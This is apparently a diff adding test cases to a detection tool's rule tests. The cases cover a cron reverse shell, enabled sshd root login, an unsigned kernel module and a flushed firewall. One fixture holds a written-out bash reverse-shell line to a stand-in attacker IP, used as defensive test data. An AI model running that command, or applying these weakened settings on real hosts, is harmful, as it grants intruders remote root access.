@@ -437,6 +437,70 @@ FIRE = [
         "observed",
         id="hosts-entry-added",
     ),
+    pytest.param(
+        [],
+        [
+            rec(
+                "scheduled_tasks",
+                "cron:/etc/cron.d/sysupd#1",
+                {"entry": "* * * * * root bash -i >& /dev/tcp/203.0.113.9/9001 0>&1"},
+                scope="cron",
+            )
+        ],
+        "cron:/etc/cron.d/sysupd#1",
+        "BO-EXE-002",
+        "high",
+        "heuristic",
+        id="cron-reverse-shell-command",
+    ),
+    pytest.param(
+        [
+            rec(
+                "config",
+                "config:sshd:permitrootlogin",
+                {"value": "prohibit-password"},
+                scope="sshd",
+            )
+        ],
+        [rec("config", "config:sshd:permitrootlogin", {"value": "yes"}, scope="sshd")],
+        "config:sshd:permitrootlogin",
+        "BO-CFG-008",
+        "high",
+        "observed",
+        id="sshd-root-login-enabled",
+    ),
+    pytest.param(
+        [],
+        [rec("config", "config:kmod:rootkitmod", {"taint": "OE"}, scope="kmod")],
+        "config:kmod:rootkitmod",
+        "BO-CFG-009",
+        "medium",
+        "observed",
+        id="unsigned-kernel-module",
+    ),
+    pytest.param(
+        [
+            rec(
+                "config",
+                "config:firewall:linux-iptables",
+                {"policy_input": "DROP", "rules": "5", "sha256": "a"},
+                scope="firewall",
+            )
+        ],
+        [
+            rec(
+                "config",
+                "config:firewall:linux-iptables",
+                {"policy_input": "ACCEPT", "rules": "0", "sha256": "b"},
+                scope="firewall",
+            )
+        ],
+        "config:firewall:linux-iptables",
+        "BO-CFG-010",
+        "high",
+        "observed",
+        id="linux-firewall-flushed",
+    ),
 ]
 
 
@@ -1105,4 +1169,4 @@ def test_every_rule_is_documented_and_documented_rules_exist() -> None:
     text = (ROOT / "docs" / "detection-rules.md").read_text(encoding="utf-8")
     documented = set(re.findall(r"`(BO-[A-Z]+-\d{3})`", text))
     assert documented == {r.rule_id for r in detection.RULES}
-    assert "27" in text and len(detection.RULES) == 27
+    assert "31 rules" in text and len(detection.RULES) == 31
